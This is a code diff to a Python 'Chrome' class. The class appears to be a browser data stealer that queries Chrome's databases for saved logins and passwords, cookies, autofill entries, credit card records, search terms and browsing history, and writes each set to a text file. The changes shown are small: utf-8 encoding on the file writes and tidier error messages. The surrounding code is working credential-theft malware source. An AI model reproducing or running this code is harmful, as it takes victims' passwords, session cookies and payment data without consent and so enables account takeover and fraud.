@@ -50,7 +50,7 @@ class Chrome:
             try:
                 cursor.execute("SELECT action_url, username_value, password_value FROM logins")
 
-                with open("passwords.txt", "w") as f:
+                with open("passwords.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         url = item[0]
                         username = item[1]
@@ -77,7 +77,7 @@ class Chrome:
             try:
                 cursor.execute("SELECT host_key, name, encrypted_value from cookies")
 
-                with open("cookies.txt", "w") as f:
+                with open("cookies.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         host = item[0]
                         user = item[1]
@@ -104,7 +104,7 @@ class Chrome:
             try:
                 cursor.execute("SELECT name, value FROM autofill")
 
-                with open("autofill.txt", "w") as f:
+                with open("autofill.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         name = item[0]
                         value = item[1]
@@ -112,7 +112,7 @@ class Chrome:
 
                 cursor.execute("SELECT * FROM credit_cards")
 
-                with open("credit_cards.txt", "w"):
+                with open("credit_cards.txt", "w", encoding="utf-8"):
                     for item in cursor.fetchall():
                         username = item[1]
                         encrypted_password = item[4]
@@ -128,7 +128,7 @@ class Chrome:
             conn.close()
             os.remove(web_data_db_copy)
         except Exception as e:
-            print(f"[!]Error {e}")
+            print(f"[!]Error: {e}")
 
     def history(self):
         try:
@@ -141,14 +141,14 @@ class Chrome:
             try:
                 cursor.execute('SELECT term FROM keyword_search_terms')
 
-                with open("search_history.txt", "w") as f:
+                with open("search_history.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         term = item[0]
                         f.write(f"{term}\n")
 
                 cursor.execute('SELECT title, url, last_visit_time FROM urls')
 
-                with open("web_history.txt", "w") as f:
+                with open("web_history.txt", "w", encoding="utf-8") as f:
                     for item in cursor.fetchall():
                         title = item[0]
                         url = item[1]
@@ -162,7 +162,7 @@ class Chrome:
             conn.close()
             os.remove(history_db_copy)
         except Exception as e:
-            print(f"[!]Error {e}")
+            print(f"[!]Error: {e}")
 
 
 if __name__ == "__main__":
